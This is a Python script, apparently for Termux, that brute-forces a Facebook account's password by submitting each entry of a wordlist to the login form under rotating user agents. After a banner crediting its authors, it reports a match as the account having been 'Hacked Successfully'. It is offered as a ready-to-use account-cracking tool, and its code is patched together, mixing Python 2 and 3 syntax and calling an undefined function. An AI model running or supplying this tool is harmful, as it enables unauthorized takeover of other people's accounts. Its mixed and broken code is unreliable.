#-*-coding:utf8;-*-
#qpy:3
#qpy:console

import os
os.system('termux-open-url "https://www.facebook.com/groups/1864140940265166/" ')
A='\033[1;31m'
B='\033[1;32m'
C='\033[1;33m'
D='\033[1;34m'
E='\033[1;35m'
F='\033[1;36m'
grb='''@:[1864140940265166]'''
print(B)
os.system('cowsay -f eyes "MOHAMED LKAMILI PRO W REDA TSUNA" ')
print(A)
ok="""
==============================================
 .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
           _      _____ ______ _   _  _____
     /\   | |    |_   _|  ____| \ | |/ ____|
    /  \  | |      | | | |__  |  \| | (___
   / /\ \ | |      | | |  __| | . ` |\___ \
  / ____ \| |____ _| |_| |____| |\  |____) |
 /_/    \_\______|_____|______|_| \_|_____/
================================================
""".format(A, B, A,B, grb, A,C, A, C, A, C, A, C, A, C, A, C, A, C, A,'Welcome To @Termux@ ')
print(ok)
#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random

W = '\033[1;37;40m'
Br = '\033[1;31;40m'
Bg = '\033[1;32;40m'
Y = '\033[1;33;40m'
Bb = '\033[1;34;40m'
Bm = '\033[1;35;40m'
Bc = '\033[1;36;40m'





#email
email = str(raw_input("Email or Phone: "))

#wordlist
passwordlist = str(raw_input("Wordlist Path : "))

#Target Website
login = 'https://www.facebook.com/login.php?login_attempt=1'

#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")



def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print(Bg +"\n\n[+] Email/Phone: " + email + " Password: {}".format(password)) + W
			print Bg + "[+] " + email + " Has been Hacked Successfully!!!" + W
			m = raw_input(' Do You want to exit? (y/n)')
			if m == 'y':
				exit()
			elif m == 'n':
				intro()
				


def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)


#welcome 
def welcome():
	total = open(passwordlist,"r")
	total = total.readlines()
	print
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"


if __name__ == '__main__':
	main()

